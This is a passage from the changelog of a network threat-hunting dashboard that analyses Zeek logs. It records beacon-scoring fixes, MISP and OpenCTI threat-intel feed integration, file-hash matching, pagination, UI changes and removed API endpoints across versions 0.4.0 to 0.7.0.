  are recovered.** The lazy-init replay fix above feeds two
  additional samples into the timing-regularity reservoir for
  every beacon pair. Magnitude is small — the strobe golden
  fixture's beacon finding shifts from `ts=0.75` to `ts=0.76`
  (+0.01) on 1000 connections; the final integer score is
  unchanged at 57. Low-connection beacons right at the
  10-connection threshold gain ~22% more samples on the timing
  axis and may see a larger shift. Direction is uniformly
  upward (more samples = better statistical confidence in
  regularity); no false-positive risk added.

- **Beacon (TCP and HTTP) scores rise on multi-sensor `/logs/`
  trees.** The cross-sensor smearing fix above un-suppresses
  beacons that were being penalised on the histogram + duration
  axes when more than one sensor's logs sat in `/logs/` at
  analyze time. Operators with single-sensor deployments see
  no change. Multi-sensor operators should expect beacons in
  each sensor's capture to score closer to what they would
  have scored if analysed alone — re-baseline any min-score
  alerting that was tuned to the artificially-deflated
  numbers. Golden fixtures (single-sensor by construction) are
  unchanged.

### Breaking

- **`/api/config` no longer carries the four removed beacon
  fields.** Responses drop them; PUTs that include them are
  silently ignored by Go's JSON decoder. No DB migration —
  config is a single JSON blob in the `settings` table; the
  next config save naturally drops the dead fields.

## [v0.7.0] — 2026-05-09

### Fixed

- **`Store.SetFindings` ID-collision bug.** The analyzer assigns
  per-run sequential IDs starting at 1, while the merge logic
  preserved historical findings (those whose fingerprint didn't
  match anything in the new run) with their original DB IDs. When
  the analyzer's fresh IDs (1, 2, 3…) overlapped with preserved
  historical IDs, `saveFindings` failed with `UNIQUE constraint
  failed: findings.id` and the analyze pass's findings were lost
  on rollback. Latent pre-v0.7.0 — most analyses regenerated
  nearly every fingerprint each run so collisions were rare. The
  TI Hit type split surfaced it: every legacy `Threat Intel Hit`
  finding is preserved as historical (its fingerprint doesn't
  match any new `TI Hit (IP/Domain/Hash)` finding), and the new TI
  findings stomp through the same low-ID range. Fix: `SetFindings`
  now carries stable IDs forward on fingerprint matches and
  assigns truly-new fingerprints IDs above the maximum historical
  ID — collision-free regardless of how many old findings get
  preserved.

### Added

- **Multi-sheet XLSX export.** New "XLSX (multi-sheet)" option on
  the **Export all** dropdown produces an `.xlsx` workbook with six
  sheets — `Findings` (open), `Acknowledged`, `Escalated`,
  `IOC Hits`, `Campaigns`, `Hosts` — that opens cleanly in Excel,
  Numbers, and LibreOffice. Driven server-side via
  `/api/export/xlsx`; the campaigns and hosts roll-ups are
  computed in Go (mirrors the JS UI logic) so the file is
  self-contained. CSV and JSON options unchanged. Adds the
  `github.com/xuri/excelize/v2` dependency (pure-Go, no CGO, MIT).

### Changed

- **Hosts CSV column order matches the UI.** `archer_hosts_*.csv`
  now leads with `risk_score`, then `host_ip`, `findings`,
  `severity`, `finding_types` — same order as the Hosts tab.
  Pre-v0.7.0 the CSV led with `host_ip`. The XLSX export's Hosts
  sheet uses the same order.

### Detection changes

- **`Threat Intel Hit` finding type split.** Pre-v0.7.0 every
  feed-driven match (FeodoTracker IP, URLhaus IP/domain, OTX,
  AbuseIPDB, MISP/OpenCTI IP/CIDR, MISP/OpenCTI domain) collapsed
  into a single `Threat Intel Hit` type, which made the Type
  filter dropdown useless for narrowing down "show me only domain
  hits" or "show me only the new file-hash matches." The type now
  splits three ways based on what was matched:
  `TI Hit (IP)` / `TI Hit (Domain)` / `TI Hit (Hash)`. Suspicious
  URL is unchanged. The IOC Hits tab continues to surface all of
  them together (notification bell, host-risk weighting, IOC tab
  inclusion all updated to recognize the three new types).
  Old findings with the legacy `Threat Intel Hit` type still
  classify correctly via a backwards-compat helper (`IsThreatIntelType`),
  so pre-v0.7.0 findings persisted in operator DBs continue to
  land in the right tab and trigger notifications.

  **Re-baseline note.** The fingerprint includes Type, so old
  `Threat Intel Hit` findings will NOT merge with newly-emitted
  `TI Hit (IP)/(Domain)/(Hash)` findings on the next Analyze —
  fresh entries appear alongside the old ones. Two upgrade paths:
  (a) accept the temporary duplication; old findings age out via
  archive prune, or the operator can manually clean them up; or
  (b) run **Discard findings & re-analyze** once after upgrade to
  start clean (loses analyst state on existing TI findings, but
  the new fingerprints are stable going forward). Phase 4 golden
  fixtures regenerated to match the new type strings.

- **File-hash matching against MISP / OpenCTI feeds.** Pre-v0.7.0,
  hash-typed feed indicators (md5 / sha1 / sha256) were persisted
  to `feed_indicators` correctly but `Store.EnabledFeedIndicators`
  silently dropped them because no analyzer-side field carried a
  hash candidate. The `Hashes` map on `feeds.SourcedIndicators` is
  now populated with lowercased hex strings, and a new analyzer
  step `checkFileHashes` (Phase 3, alongside `checkSuspiciousURLs`
  and `checkTI`) scans `files.log`'s md5 / sha1 / sha256 columns
  against the bucket. Matches emit a `Threat Intel Hit` (HIGH /
  score 90) attributed to the matching feed, with the detail line
  carrying algorithm + hash hex + filename + MIME + tags.
  Algorithm-agnostic on the analyzer side: a single Hashes map per
  feed combines all three algorithms and each row's three hash
  columns are tested against it. The `(downloader, hashvalue)`
  fingerprint dedups so a file with all three algorithms in the
  feed only fires once. Re-baseline expected: hash-rich feeds
  (MISP master, ThreatFox) start producing findings on file
  downloads that were previously invisible.

### Changed

- **Cached `EnabledFeedIndicators` on the store.** The analyzer-side
  feed-bucket snapshot used to rebuild on every analyze tick — a
  `ListFeeds` + per-feed `ListFeedIndicators` + CIDR-parse pass that
  ran whether or not feed state had actually changed. The result is
  now memoized on `Store`; feed CRUD (`CreateFeed`, `UpdateFeed`,
  `DeleteFeed`) and indicator writes (`UpsertFeedIndicators`,
  `RemoveStaleIndicators`) drop the cache so the next read rebuilds.
  Invisible from the outside — every analyze pass sees the same
  bucket shape it always did, just without the redundant
  reconstruction.

### Added

- **Interactive zoom on the beacon chart Timeline view.** Click-drag
  on the canvas to brush-select a time range; the view re-fits to
  that slice without re-fetching anything (the data was already in
  `f.ts_data`). Right-click resets to auto-fit, or use the
  Reset zoom button that appears next to the view tabs once a zoom
  is active. Zoom is dropped automatically when switching to the
  Interval histogram or Bytes view since those have their own X
  mappings; opening the chart for a new finding starts at auto-fit.

- **MISP adapter pagination + truncation visibility.** The MISP
  fetcher now walks `/attributes/restSearch`'s `page` + `limit`
  parameters in batches of 10000 up to 100 pages (1M attributes),
  instead of issuing a single 100k-attribute request and silently
  truncating large feeds. When the adapter hits the cap with the
  upstream still indicating more data, the feed row's new
  `last_fetch_truncated` field flips to `true` and the Feeds
  dialog surfaces a "⚠ truncated" badge next to the indicator
  count. OpenCTI already paginated correctly via cursors;
  truncation visibility is wired up there too. Schema change:
  `feeds.last_fetch_truncated` column added via migration
  `0005_feeds_last_fetch_truncated.sql`.

### Removed

- **Per-feed `refresh_cadence_minutes` field.** Dead since v0.6.0,
  when feed refresh moved to the watch full-pass cadence. The
  `feeds.refresh_cadence_minutes` column is dropped via migration
  `0004_drop_refresh_cadence_minutes.sql` and the field is removed
  from the wire shapes (`/api/feeds` request/response), the Feeds
  dialog (column + edit input), the `feeds.Feed` Go struct, and
  the per-feed worker code (which now ticks on a fixed 60-minute
  cadence if anyone re-enables `startFeedWorker`).

### Breaking

- **`/api/feeds` request shape.** External scripts that POST or PUT
  feeds with a `refresh_cadence_minutes` field will get a JSON
  decode error. Drop the field from the request body. The default
  validation that required `refresh_cadence_minutes ≥ 1` is gone.
- **`/api/feeds` response shape.** External scripts that read
  `refresh_cadence_minutes` from the response will get an
  unmarshal-into-int-zero or KeyError. The field is no longer
  emitted.
- **DB schema.** The `feeds.refresh_cadence_minutes` column is
  dropped. Existing values are lost. Forward-only — restoring
  requires a new migration that adds the column back.

### Added

- **`/api/logs/tree` endpoint.** Returns a sensor → date roll-up of
  what's currently under `/logs/`, with file counts, total bytes,
  and newest mtime. Drives the new logs preview pane.
- **Logs preview pane in the sidebar.** A read-only tree showing
  the sensor → date layout under `/logs/`; clicking a sensor
  expands its dates with file counts and sizes. Refreshes
  automatically when an analyze pass finishes (so newly-arrived
  logs become visible without a page reload). The `Analyze logs`
  button is disabled when the tree is empty — an unambiguous
  signal that there's nothing to act on.

### Changed

- **`/api/analyze` is now the sole analyze entry point and always
  scans `/logs/`.** Pre-v0.7.0 the dashboard `Analyze` button
  required that `Import` be clicked first (which actually called
  `/api/logs/scan` to register `/logs/` paths into an uploaded-files
  list); calling `/api/analyze` with nothing imported returned
  `{"error":"no files to analyze"}`. The endpoint now scans
  `/logs/` directly and runs a full pass with fingerprint-merge
  on every invocation. The `files` field in the request body is
  no longer honored — the only input is what's on disk under
  `/logs/`. The `Analyze logs` button is the sole UI trigger.
- **`/api/analyze/reset` always scans `/logs/`.** Removes the
  uploaded-files preference path. Same input source as
  `/api/analyze`, with the difference being the findings wipe
  before re-analysis.

### Removed

- **`/api/upload` endpoint.** Was never wired to the UI (the
  handler existed in `upload.go` but no route registration
  pointed at it) and had structural fit problems for the use
  case it would serve — multipart total cap of 512 MB,
  no streaming or resume, no progress feedback, files saved
  to `/tmp/archer_uploads/` in the container layer (lost on
  rebuild), and a separate code path from `/logs/`.
  Operators with ad-hoc bundles drop them into `/logs/<name>/<date>/`
  on the host (mount, `docker cp`, or SCP via the Quiver SSH
  dropbox), where the unified pipeline picks them up.
- **`/api/logs/scan` endpoint.** Both GET (read-only logs-dir
  hint) and POST (register `/logs/` paths into uploaded-files
  list) are gone. The new `/api/logs/tree` covers the read role
  with structured output; the POST role no longer has a purpose
  since `/api/analyze` scans `/logs/` directly.
- **`/api/files` and `/api/files/clear` endpoints.** The
  uploaded-files registry no longer exists, so reading and
  clearing it are meaningless.
- **Import / Clear buttons + uploaded-bundle UI.** The sidebar's
  Zeek Logs section is replaced with a single Logs section
  containing the preview tree and an `Analyze logs` button.
- **`Store.GetUploadedFiles` / `SetUploadedFiles` /
  `AppendUploadedFile` and the in-memory `uploadedFiles`
  field.** Internal Go API, but call sites in `watch.go` are
  also dropped (the watch loop's persisted-paths copy was
  decorative — the analyzer always took its file list from the
  same scan). The DB has no table for this; nothing to migrate.

### Breaking

- **`/api/analyze` request shape.** External scripts that POST a
  `files` array will see those files ignored — `/logs/` is
  scanned regardless. Empty `/logs/` now returns
  `{"error":"no logs found in /logs"}`.
- **Removed endpoints.** `/api/upload`, `/api/logs/scan`,
  `/api/files`, `/api/files/clear` return 404. Any scripts
  depending on these need to either drop their bundle into
  `/logs/<name>/<date>/` on the host or read `/api/logs/tree`
  for the inventory view.

Working theme: usability and predictable cost. v0.5.0 was feature-complete
on Phase 7 but the dashboard hit a wall on real-world data — list responses
ballooned to ~170 MB on six-figure finding counts, and the auto-cadence
MISP worker was firing 10-minute fetches on the hour that pegged CPU
during analyst sessions. This bundle fixes both, plus a long pass of UI
polish, a major beacon-chart redesign, and per-tab pagination across the
whole dashboard.

### Added
- **Server-side pagination on `/api/findings`.** New `limit` and `offset`
  query params (default 1000, max 50000). Responses set
  `X-Total-Count` and `X-Has-More` so the UI can drive paginated
  navigation, and `Access-Control-Expose-Headers` is set so the headers
  reach JS in CORS contexts.
- **`GET /api/findings/counts`** returning `{open, ack, esc, ioc, total}`
  honoring the active filter set (minus `status` / `ioc_only`). Powers
  the info-line counters without forcing the UI to scan the full
  finding set every render.
- **`GET /api/findings/facets`** returning `{types, sensors}` — distinct
  values across the entire dataset (subject to non-dropdown filters).
  The Type and Sensor filter dropdowns now reflect every available
  value across all data, not just what's on the currently-rendered
  page. Type and sensor are stripped from the facets query so picking
  one doesn't collapse the dropdown to that single option.
- **Per-tab pagination on every tab** with first / previous / next / last
  navigation buttons (« ‹ › »). Findings, Acknowledged, Escalated, and
  IOC paginate server-side via `/api/findings`. Campaigns and Hosts
  paginate client-side over the cached aggregate set — same UX,
  different mechanics. Each tab maintains its own offset; switching
  tabs is an O(1) cache hit. Footer reads "Showing 101–200 of 5,000 ·
  Page 2 of 50" and disables boundary buttons.
- **Sortable Campaigns / Hosts columns.** Click any of Score /
  Destination / Port / Hosts on Campaigns, or Host IP / Risk Score /
  Findings / Severity on Hosts, to sort. Clicking the same column
  toggles ascending / descending. Sort indicator (↑/↓) appears next to
  the active column header, mirroring the existing Findings-table
  convention. Severity sorts by analyst-visible order
  (CRITICAL < HIGH < MEDIUM < LOW < INFO) so descending lands worst-
  first.
- **Beacon Chart redesign — three views, one dialog.** The fixed
  time-window presets (5m / 30m / 1h / …) are gone; every view auto-
  fits the X axis to the full data span. View-mode tabs at the top
  switch between:
    - **Timeline** (default) — every connection event as a vertical
      tick on a continuous time axis from first to last observation.
      Density-modulated alpha so dense regions stay visible while
      sparse ticks aren't washed out. The eye-test for "is this
      regular?".
    - **Interval histogram** — distribution of inter-arrival gaps
      between consecutive connections, top 1% trimmed so a single
      outlier gap doesn't squash the histogram. A dashed accent line
      marks the mean-interval position so you can see whether the
      peak lines up with the analyzer's reported mean. Tall single
      peak = beacon's heartbeat.
    - **Bytes** — the legacy bytes-sent-per-bucket chart, kept for
      verifying whether a beacon also exfils alongside its heartbeat.
  Plus a stats strip above the canvas: connections, mean interval,
  jitter (CV), span. And a per-view PNG / JPEG export dropdown that
  snaps the active canvas with a filename including the src→dst pair
  and view name (mirrors the cytoscape graph export pattern).
- **HTTP Beaconing findings now carry `TSData`.** The HTTP beacon
  detector (`internal/analysis/http_analysis.go`) was tracking inter-
  arrival intervals and byte values for the score, but didn't collect
  the per-event `[ts, origBytes, respBytes]` triples the chart needs.
  The state struct now reservoir-samples those triples (capped at
  `beaconTsCap = 200`, same cap conn-level beacons use), and they're
  attached to the emitted finding. Existing HTTP Beaconing findings
  show empty timeline data until they're re-detected by the next
  analysis run; the merge then overwrites the empty `TSData` field.
- **Time-range preset dropdown** in the filter bar (All time / 1d / 7d /
  1mo / 3mo / 6mo). Selecting a preset re-queries immediately; the
  manual From / To inputs in the advanced filter panel are gone — the
  preset is the only time-range control and defaults to "Last 1
  month" on first load.
- **WAL journaling** on the SQLite store (`PRAGMA journal_mode = WAL` in
  `RunMigrations`). Concurrent reader/writer behavior matches what the
  dashboard's read traffic actually does — reads no longer block on the
  long writes from analysis runs and feed indicator upserts.
- **Watch full-pass pre-flight feed refresh.** The first watch tick of
  each UTC day (and every tick when `WatchAlwaysFull` is on) now calls
  `refreshFeedsBeforeFullPass` synchronously before launching analysis.
  Every enabled MISP / OpenCTI feed is fetched in parallel under a
  two-minute global cap; failures log but do not block the analysis. A
  status SSE event (`Watch: refreshing N feed(s) before full pass.`)
  surfaces the pre-flight on the dashboard.
- **Watch incremental ticks now match against cached MISP / OpenCTI
  indicators.** `launchIncrementalAnalysis` sets `FeedProvider` so
  `AnalyzeTIOnly` consults whichever indicators the most recent full
  pass loaded. No fetch — incremental ticks remain network-free —
  closes the "wait until tomorrow" gap on fresh hits from configured
  feeds. Adds a few seconds per tick to rebuild the indicator buckets
  from SQLite; the cost is bounded by total enabled-feed indicator
  count, not log volume.

### Changed
- **Page layout reshuffle.** Sidebar runs full-height from the top of
  the page to the bottom — no jog where the topbar used to interrupt
  it. The Archer crosshairs + wordmark moved into the sidebar at the
  top, with "Silent Hunter" centered underneath as a small uppercase
  tagline. The topbar in the right column shrunk to 48px (action
  buttons only: bell, Sensors, Feeds, Users, Settings, user-badge).
- **Right-click menu auto-positions.** The static 220×200 fallback
  margin under-counted the menu after font bumps; clicks near the
  right or bottom edge cut it off. JS now measures the rendered menu
  with `getBoundingClientRect()` and clamps into the viewport with an
  8px margin. Click-anchor arrow at one of the menu's four corners
  (↖↗↙↘) points back at the click — useful when the menu had to flip
  away from the cursor to fit.
- **Findings list responses are now projection-shaped.** New internal
  `listFinding` type drops `TSData`, `Intervals`, and `Notes` from
  every `/api/findings` row — those fields balloon to hundreds of KB
  per row on beacon-rich datasets and are only consulted on detail
  pages anyway. The detail endpoint (`/api/findings/{id}`) still
  returns the full `model.Finding`, and a row click now upgrades
  `_selectedFinding` via a follow-up fetch so the chart, intervals,
  and notes render correctly without bloating the list. Beacon-Chart
  visibility on the right-click menu and detail-pane button now gates
  on finding type (`Beaconing` / `HTTP Beaconing`) instead of
  ts_data presence — type is in the projection, ts_data is not.
- **Right-click menu on Campaigns / Hosts** hides Acknowledge,
  Escalate, and Suppress (and the separator above them). Those
  actions operate on a single finding's status and don't make sense
  on a synthesised aggregate row. They still appear on Findings,
  Acknowledged, Escalated, and IOC tabs.
- **Feed indicator upserts now batch in 1000-row chunks.** Each batch is
  its own transaction (`upsertFeedIndicatorBatch`) so a 100k-row MISP
  refresh no longer holds the writer for the whole upsert duration.
- **Per-feed `RefreshCadenceMinutes`** is now effectively unused. The
  field stays on the row for forward compatibility (and the validator
  still requires `≥ 1`), but no scheduler reads it. Refreshes are
  driven by the watch full-pass cadence — see `docs/FEEDS.md`.
- **Settings → Watch Mode** "Always run full scan on every watch tick"
  now also forces a feed refresh on every tick (because every tick is
  a full pass under the override). Previously this checkbox only
  affected the analyzer phase selection.
- **UI text and chrome polish.** Body font bumped 13 → 17 px; every
  explicit `font-size` in `archer.css` bumped by 2 px. Filter
  dropdowns and dialog inputs got thicker (taller padding, larger
  text) without growing wider. Sidebar inputs (`.sidebar-input`)
  bumped to match (`padding: 9px 10px`, `font-size: 16px`). Findings
  table cells normalize to the body font size — the previous explicit
  `font-size: 11px` on src-ip / dst-ip / sensor / detail cells is
  removed. The Findings table's first column (icon) widened 38 → 56
  px so the icon no longer clips next to "icon…". The pagination
  control moved inline with the tab bar instead of its own row,
  right-justified. Sortable column widths bumped on Campaigns and
  Hosts so the sort-indicator arrow doesn't truncate the header text.
  Sensors-dialog Pending Tokens "Override name" 130 → 180 px;
  Unauthorized Attempts "Count" 80 → 110 px so longer values render
  without ellipsis.

### Removed
- **`POST /api/feeds/refresh-all`** and the dashboard sidebar "Refresh
  feeds" button that called it. Watch-tick auto-refresh covers the
  steady-state case; the per-feed Refresh button (still in the Feeds
  dialog) covers admin one-shot validation.
- **From / To time-range inputs** in the advanced filter panel — the
  filter-bar preset dropdown is the only time-range control now.
- **Auto-cadence MISP / OpenCTI fetcher worker.** `s.startFeedWorker()`
  in `server.New` was already commented out behind a feature comment;
  this release commits to the watch-driven model and updates the
  surrounding documentation. Re-enabling is still a one-line change
  if a deployment wants per-feed cadence back.
- **Beacon-chart preset time-window buttons** (5m / 30m / 1h / 6h / 24h
  / 7d / 1mo / 1y). Replaced by the auto-fit X axis and the three
  view-mode tabs described above.

### Breaking
- `POST /api/feeds/refresh-all` removed — no replacement. Force a
  refresh by triggering a full-pass watch tick (`WatchAlwaysFull`
  toggle, or *Discard findings & re-analyze* which runs as a full
  pass), or use the per-feed `/api/feeds/{id}/refresh` endpoint
  for one-shot validation. Endpoint existed only in v0.5.0 and was
  admin-gated, so practical blast radius is operator scripts only.

### Detection changes
None. Detection semantics are unchanged from v0.5.0 — same score
formulas, same thresholds, same finding types. Two non-semantic
data-shape changes:
- HTTP Beaconing findings now carry `TSData` (previously empty).
  Affects `/api/findings/{id}` and `/api/export/json`; the value is
  reservoir-sampled chart data, not a detection signal.
- Incremental ticks now *see* MISP / OpenCTI indicators that they
  didn't see in v0.5.0, but the matching logic is the same
  `checkTI` / `checkSuspiciousURLs` code path; an indicator that
  produces a Threat Intel Hit in a full pass will produce the same
  Threat Intel Hit in an incremental pass.

---

## [v0.5.0] — 2026-05-08

This release closes Phase 6 (API contract reference + deprecation
policy) and Phase 7 (MISP / OpenCTI threat-intel feed integration).
The full feed pipeline is operator-usable end to end: configure
feeds in the new admin UI, the worker fetches indicators on cadence,
and the analyzer's TI matching paths now consult those feed
indicators alongside the built-in URLhaus / Feodo lists. Findings
that match a feed indicator carry per-feed provenance
(`SourceFile: feed:<name>`) plus any upstream tags inline. Two
phase-7 follow-ups also land here: a per-feed TLS-verify bypass for
self-signed internal MISP / OpenCTI deployments, and the analyzer-
side wiring that consumes `feed_indicators` to actually emit Threat
Intel Hit / Suspicious URL findings from feed matches.

### Added
- **Analyzer-side feed matching.** The TI hot path now consults
  enabled MISP / OpenCTI feeds during phase-0 prefetch and tests
  candidate IPs / CIDRs / domains against them in `checkTI` and
  `checkSuspiciousURLs`. Matches emit `Threat Intel Hit` (HIGH /
  score 90) or `Suspicious URL` (HIGH / score 90) findings tagged
  with `feed:<name>` plus any upstream tags inline in Detail. New
  `analysis.FeedProvider` interface (aliased to `feeds.Provider`)
  is satisfied by the Store; analyzer construction sites in
  `handlers_api.go` and `watch.go` wire it via
  `Analyzer.SetFeedProvider`. Hash indicators are stored but not
  yet matched — no analyzer field today carries a hash candidate;
  closes when file-finding analyzers grow that field.
- **Per-feed TLS-verify bypass.** New `tls_skip_verify` boolean on
  the `feeds` table (migration `0003_feeds_tls_skip_verify.sql`)
  with a checkbox in the feed-edit dialog and a warning sub-text
  ("only enable for trusted internal feeds"). Threaded through to
  `MISPClient` / `OpenCTIClient` constructors as a Transport
  override. Default off — operators opt in deliberately per feed.
  Closes the common deployment friction where a lab MISP runs with
  a self-signed cert that the Archer container's CA bundle doesn't
  trust.
- **Feed-aggregator schema (Phase 7 slice 1).** New `feeds` and
  `feed_indicators` tables land via `0002_feeds.sql` migration.
  Schema-only for now — the fetcher worker, MISP/OpenCTI source-type
  adapters, and admin UI ship in subsequent slices. The `feeds` table
  records configured feed instances (source type, URL, API key,
  refresh cadence, aging window, status); `feed_indicators` records
  the per-indicator stream the fetcher will populate.
- **Feeds admin UI (Phase 7 slice 5b).** New "Feeds" topbar button
  (admin + analyst, like Sensors) opens a management dialog listing
  every configured feed with name, source type, status pill,
  indicator count, last-refresh timestamp, cadence, and aging
  window. Admins get add / edit / delete / refresh row controls;
  analysts get the read-only view. The edit dialog handles both
  create and update; on edit, the API-key field shows a
  "leave blank to keep existing" hint and submitting empty
  preserves the stored key (matches the slice 5a server behavior).
  Manual-refresh button shows the live add/refresh counts inline
  on the row for ~2.5s after a fetch lands. With this slice, the
  full Phase 7 path is operator-usable end to end without SQL —
  configure a feed in the UI, the worker fetches on cadence,
  matching findings get tagged with `ioc_source: "Feed: <name>"`.
- **Feeds admin API endpoints (Phase 7 slice 5a).** `/api/feeds`
  (GET list, POST create) and `/api/feeds/{id}` (PUT update, DELETE
  remove) plus `/api/feeds/{id}/refresh` (POST manual fetch).
  Reads are open to any authenticated user; mutations and
  manual-refresh require admin. The API key field is write-only —
  `POST` and `PUT` accept it in the request body, but `GET`
  responses redact it (replaced with a `has_api_key: bool` flag) so
  a stolen session cookie can't scrape feed credentials. `PUT` with
  an empty `api_key` keeps the existing key (avoids the foot-gun
  where re-saving a config without re-typing the secret blanks it
  out). The manual-refresh endpoint is synchronous with a 60s
  upstream cap and reports added/refreshed indicator counts in the
  response so the admin sees what just happened. Slice 5b will land
  the corresponding admin UI; until then, configuring a feed still
  needs `curl` instead of SQL.
- **Matcher composition + per-finding provenance (Phase 7 slice 4).**
  Feed indicators are now joined into the IOC matching surface used
  by `/api/findings`. The Store exposes `IOCSources() []SourcedMatcher`
  returning the operator IOC matcher first, then one matcher per
  enabled feed in feed-id order. The findings filter walks the
  sourced-matcher slice and short-circuits on the first hit, tagging
  the finding with the matching source label
  ("Operator IOC list" or "Feed: <feed name>").
- **`Finding.IOCSource` field on the API response.** New
  `ioc_source` JSON field surfaces which list flagged each finding —
  what the analyst UI's status icon and detail panel will key off.
  Computed at read time from the current Store snapshot, not
  persisted (feed indicators age out and can switch source on the
  next refresh; the persisted thing is `ioc_match: bool`). Threat
  Intel Hit / Suspicious URL findings (intrinsic IOCs per the
  analyzer) get `"Threat Intel Hit"` as the source label. This is
  an additive HTTP API change — `omitempty` keeps existing clients
  unaffected.
- **Per-feed matcher cache.** Each enabled feed gets a compiled
  matcher cached on first read; `UpsertFeedIndicators` /
  `RemoveStaleIndicators` / `DeleteFeed` invalidate the cache for
  the affected feed so the next IOC-match call rebuilds with current
  state. With this in place the MISP/OpenCTI integration is fully
  end-to-end: configure a feed (currently via SQL until slice 5's
  admin UI lands), the worker fetches and writes indicators, those
  indicators light up matching findings on the next `/api/findings`
  call.
- **OpenCTI source-type adapter (Phase 7 slice 3).** New
  `internal/feeds/opencti.go` mirrors the MISP adapter but speaks
  OpenCTI's GraphQL `/graphql` endpoint with bearer authentication.
  Walks cursor-based pagination (`first` / `after`), capped at 100
  pages × 1000-row default page size so a misconfigured huge tenant
  can't OOM the worker. Reads the canonical
  `x_opencti_main_observable_type` field plus the STIX pattern from
  each indicator node; the type drives bucket selection
  (`IPv4-Addr`/`IPv6-Addr` → `IndicatorIP` or `IndicatorCIDR`,
  `Domain-Name`/`Hostname` → `IndicatorDomain`, `StixFile` →
  `IndicatorHash`), with `Url` and unknown types deliberately
  skipped. STIX-pattern value extraction handles both unquoted and
  quoted property paths (e.g. `file:hashes.'SHA-256' = '<hash>'`)
  by scoping the regex to the right-hand side of `=`. Server's
  AdapterFor switch now constructs an `OpenCTIClient` for
  `source_type = 'opencti'` feed rows. Same caveat as slice 2: no
  admin UI yet (slice 5), so feeds need manual SQL configuration to
  exercise the path; matcher consumption still pending slice 4.
- **MISP source-type adapter + fetcher worker (Phase 7 slice 2).**
  New `internal/feeds` package introduces the source-agnostic
  `Adapter` interface, the normalized `Indicator` type, and a
  `Worker` that schedules per-feed refreshes on each feed's
  configured cadence. The MISP adapter (`misp.go`) hits
  `/attributes/restSearch` with `Authorization: <api-key>`, filters
  to network-indicator attribute types
  (`ip-src`/`ip-dst`/`domain`/`hostname`/`md5`/`sha1`/`sha256`),
  and normalizes into `IndicatorIP`/`IndicatorCIDR`/`IndicatorDomain`/`IndicatorHash`
  with tag round-trip. URLs are skipped at this slice (need
  host/path parser logic to feed into per-finding correlation;
  punted to a follow-up). Worker reconciles its goroutine set
  against the `feeds` table every 30s so admin-UI changes
  propagate without a server restart, fires the first tick
  immediately on start to populate freshly-added feeds, and
  records last-error / status in the feed row on transient
  upstream failures. New Store CRUD methods land for the `feeds`
  and `feed_indicators` tables. SQLite foreign-key enforcement is
  now enabled at migration time so the `ON DELETE CASCADE` on
  `feed_indicators` actually fires when a feed is deleted.
  Without an admin UI yet (slice 5), no feeds get configured by
  default and the worker is a no-op for existing installs.
- **Cached list matchers in the Store.** A new `internal/match`
  package holds the compiled-list matcher type previously inlined
  in `internal/server/findings_filter.go`. The Store builds the
  allowlist and IOC matchers once at startup and rebuilds them
  inside `SetAllowlist` / `SetIOCList` — what was previously
  rebuilt per `/api/findings` request, costing 100-500ms on a hot
  list. Matcher values are immutable post-compile and shared across
  goroutines via pointer copy under the store's read lock.
- **API contract reference (Phase 6).** New `docs/API.md` enumerates
  every `/api/*` endpoint, plus `/login`, `/logout`, `/register`,
  `/events`, and the three sensor-facing `/quiver/*` endpoints.
  Documents the Finding model shape end-to-end, the `/api/findings`
  query-parameter set (search/type/severity/min_score/delta/IPs/
  ports/sensor/from-to/status/ioc_only/sort/dir), the Quiver
  enrollment+checkin protocol and the structured
  protocol-version-mismatch error, the SSE event catalog, and the
  conventions for auth, roles, error format, and time formats.
  Also documents the four breaking-change surfaces by name and lays
  out a one-minor-version-cycle deprecation policy for field/endpoint
  removals (RFC 7234 `Warning: 299 -` header on the deprecated
  surface for one cycle, then removed under `### Breaking`). README
  Operations section links to the new doc.

### Detection changes
- **Threat Intel Hit and Suspicious URL findings now fire from
  MISP / OpenCTI feed matches.** Before this release, those finding
  types only fired from the built-in URLhaus / FeodoTracker /
  OTX / AbuseIPDB sources; feed indicators were stored but never
  produced findings. Behavior change: deployments with at least one
  enabled feed will see additional findings on next analysis whose
  dst-IP / DNS-query / HTTP-host overlaps with the feed's
  indicators. Severity HIGH / score 90 (lower than URLhaus's
  CRITICAL / 96-97 — these are unverified relative to URLhaus's
  curated malware-distribution focus). Re-baseline if your hunt
  workflow filters on IOC source. Deployments with no feeds
  configured see no behavior change.

### Breaking
- **DB schema: `feeds` and `feed_indicators` tables (migration
  `0002_feeds.sql`).** Lands automatically on first start of
  v0.5.0. New install: created from scratch. Existing v0.4.0
  install: forward-only migration applied at startup. No data
  backfill — feeds are operator-configured post-upgrade. Rollback
  to v0.4.0 requires restoring `/data` from backup; there's no
  down-migration tooling.
- **DB schema: `tls_skip_verify` column on `feeds` table (migration
  `0003_feeds_tls_skip_verify.sql`).** Bundled into the same v0.5.0
  upgrade path as 0002 — single restart applies both. Default value
  0 (verification on); operators tick the per-feed checkbox to opt
  in.
- **HTTP API: `Finding.IOCSource` field added to `/api/findings`
  responses.** Additive — existing clients that ignore unknown
  fields are unaffected. Clients that strictly validate response
  schemas will need to allow the new field.

---

## [v0.4.0] — 2026-05-08

The maturation roadmap's Phase 4 (detection-semantics tests) and
Phase 5 (CI) both ship in this release, plus a long-overdue
operator-timezone fix to the off-hours detector. Every offline
detector path in the analyzer is now locked into a checked-in
golden fixture and validated on every push and PR by the new CI
workflow. The single breaking change is a config-key rename
(`watch_timezone` → `timezone`); existing installs need to re-set
their operator timezone once via the Watch sidebar.

### Added
- **CI workflow.** A single GitHub Actions workflow at
  `.github/workflows/ci.yml` runs on every push to `main` and every
  pull request targeting `main`. Three jobs in parallel: `lint`
  (gofmt + go vet), `test` (go test -race), and `build` (CGO_ENABLED=0
  static binary plus a Docker build smoke check that mirrors the
  multi-stage `Dockerfile` flags). The build job depends on lint+test
  passing first so a broken test doesn't waste a Docker image build.
  Each push surfaces as ✅ or ❌ on the commit; the README has a CI
  badge linking to the workflow runs page.
- Phase 5 of the maturation roadmap is complete; future PRs (including
  Phase 4's detection-semantics tests) inherit the gate automatically.
- **Detection-semantics test scaffolding (Phase 4.1).** First slice of
  the golden-file framework. `internal/analysis/stats_test.go` covers
  the math helpers (`fmedian`, `fmean`, `bowleyScore`, `madScore`,
  `statisticalScore`, `computeHistogram`, `cvScore`, `bimodalScore`,
  `histScoreRegularity`, `durationScore`, `shannonEntropy`) with table
  tests and edge cases. `internal/analysis/golden_test.go` runs the
  full analyzer over a synthetic Zeek NDJSON corpus under
  `internal/analysis/testdata/zeek/` and diffs the resulting findings
  against a checked-in `expected_findings.json`. Running with `-update`
  regenerates the golden file when a CHANGELOG-acknowledged detection
